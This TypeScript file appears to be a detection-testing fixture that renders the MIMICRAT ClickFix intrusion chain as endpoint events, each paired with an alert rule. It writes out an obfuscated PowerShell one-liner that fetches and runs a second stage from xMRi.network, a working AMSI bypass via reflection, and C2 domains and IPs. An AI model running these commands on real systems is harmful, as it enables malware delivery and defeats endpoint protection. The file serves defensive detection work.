/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import type { FpTpChainDefinition, FpTpChainParentProcess, FpTpChainProcess } from '../../world';

export const MIMICRAT_SCENARIO_KEY = 'mimicrat-clickfix';

export const MIMICRAT_SOURCE_REF =
  'https://www.elastic.co/security-labs/threat-command/mimicrat-custom-rat-mimics-c2-frameworks';

export const MIMICRAT_HOST = 'WS-FIN-214';

export const MIMICRAT_USER = 'j.meyer';

export const MIMICRAT_ATTACK_ID = 'ad-fp-tp-mimicrat-clickfix-attack';

export const MIMICRAT_STAGE2_DOMAIN = 'xMRi.network';

export const MIMICRAT_C2_DOMAIN = 'd15mawx0xveem1.cloudfront.net';

export const EXPLORER_PARENT: FpTpChainParentProcess = {
  name: 'explorer.exe',
  pid: 844,
  executable: 'C:\\Windows\\explorer.exe',
};

const POWERSHELL: FpTpChainProcess = {
  name: 'powershell.exe',
  pid: 4812,
  executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
  commandLine:
    "powershell.exe -WInDo Min $RdLU='aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf';$OnRa=($RdLU.Substring(17,12));$jOFn=.($RdLU[(87)/(3)]+$RdLU[19]+$RdLU[2]) $OnRa;$TNNt=$jOFn; .($TNNt.Remove(0,3).Remove(3))($TNNt);",
  parent: EXPLORER_PARENT,
};

const LOADER_PATH = 'C:\\ProgramData\\knz_8fq2t1vw.zbuild\\zbuild.exe';

const ZBUILD: FpTpChainProcess = {
  name: 'zbuild.exe',
  pid: 5220,
  executable: LOADER_PATH,
  parent: { name: POWERSHELL.name, pid: POWERSHELL.pid, executable: POWERSHELL.executable },
};

/**
 * The MIMICRAT ClickFix chain from the Elastic Security Labs write-up, rendered as
 * endpoint events. The user pastes a PowerShell one-liner into the Run dialog; it
 * downloads a second stage, patches AMSI, drops and starts a Lua loader, and the
 * implant beacons to its CloudFront C2.
 */
export const MIMICRAT_CHAIN: FpTpChainDefinition = {
  key: MIMICRAT_SCENARIO_KEY,
  host: { name: MIMICRAT_HOST, os: { type: 'windows', name: 'Windows 11' } },
  user: { name: MIMICRAT_USER, domain: 'CORP' },
  attack: {
    id: MIMICRAT_ATTACK_ID,
    title: 'ClickFix PowerShell loader with AMSI bypass and HTTPS command and control',
    summaryMarkdown:
      'An obfuscated PowerShell one-liner started from the Run dialog downloaded a second stage, disabled AMSI, dropped and started zbuild.exe from ProgramData, and zbuild.exe beaconed over HTTPS to a CloudFront host.',
    detailsMarkdown: `On {{ host.name ${MIMICRAT_HOST} }}, {{ user.name ${MIMICRAT_USER} }} ran an obfuscated powershell.exe one-liner that resolved ${MIMICRAT_STAGE2_DOMAIN} and fetched a second-stage script. The script set amsiInitFailed through reflection, wrote ${LOADER_PATH} and started it. zbuild.exe then connected to ${MIMICRAT_C2_DOMAIN} on 443 and posted to /discover/pcversion/metrics. The sequence spans execution, defense evasion, and command and control.`,
    tactics: ['Execution', 'Defense Evasion', 'Command and Control'],
  },
  events: [
    { key: 'clickfix-powershell', category: 'process', offsetSeconds: 0, process: POWERSHELL },
    {
      key: 'stage2-download',
      category: 'network',
      offsetSeconds: 60,
      process: POWERSHELL,
      destination: { domain: MIMICRAT_STAGE2_DOMAIN, ip: '45.13.212.250', port: 443 },
    },
    {
      key: 'amsi-bypass',
      category: 'process',
      offsetSeconds: 120,
      process: {
        ...POWERSHELL,
        commandLine:
          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
      },
    },
    {
      key: 'loader-drop',
      category: 'file',
      offsetSeconds: 180,
      process: POWERSHELL,
      filePath: LOADER_PATH,
    },
    { key: 'loader-start', category: 'process', offsetSeconds: 185, process: ZBUILD },
    {
      key: 'c2-checkin',
      category: 'network',
      offsetSeconds: 300,
      process: ZBUILD,
      destination: { domain: MIMICRAT_C2_DOMAIN, ip: '18.245.139.12', port: 443 },
      url: { path: '/intake/organizations/events', query: 'channel=app' },
    },
    {
      key: 'c2-exfil',
      category: 'network',
      offsetSeconds: 360,
      process: ZBUILD,
      destination: { domain: MIMICRAT_C2_DOMAIN, ip: '18.245.139.12', port: 443 },
      url: { path: '/discover/pcversion/metrics', query: 'clientver=ds' },
    },
  ],
  stages: [
    {
      key: 'clickfix',
      ruleName: 'Obfuscated PowerShell Started from the Run Dialog',
      severity: 'high',
      riskScore: 73,
      reason: 'powershell.exe ran an obfuscated one-liner from the Run dialog and fetched a script',
      eventKeys: ['clickfix-powershell', 'stage2-download'],
    },
    {
      key: 'amsi-bypass',
      ruleName: 'AMSI Bypass via PowerShell Reflection',
      severity: 'high',
      riskScore: 79,
      reason: 'powershell.exe set AmsiUtils.amsiInitFailed through reflection',
      eventKeys: ['amsi-bypass'],
    },
    {
      key: 'loader',
      ruleName: 'Executable Written to ProgramData and Started by PowerShell',
      severity: 'high',
      riskScore: 73,
      reason: 'powershell.exe wrote zbuild.exe to a random ProgramData folder and started it',
      eventKeys: ['loader-drop', 'loader-start'],
    },
    {
      key: 'c2',
      ruleName: 'Periodic HTTPS Connections from a Newly Written Binary',
      severity: 'critical',
      riskScore: 91,
      reason: 'zbuild.exe made repeated HTTPS requests to a CloudFront host',
      eventKeys: ['c2-checkin', 'c2-exfil'],
    },
  ],
};
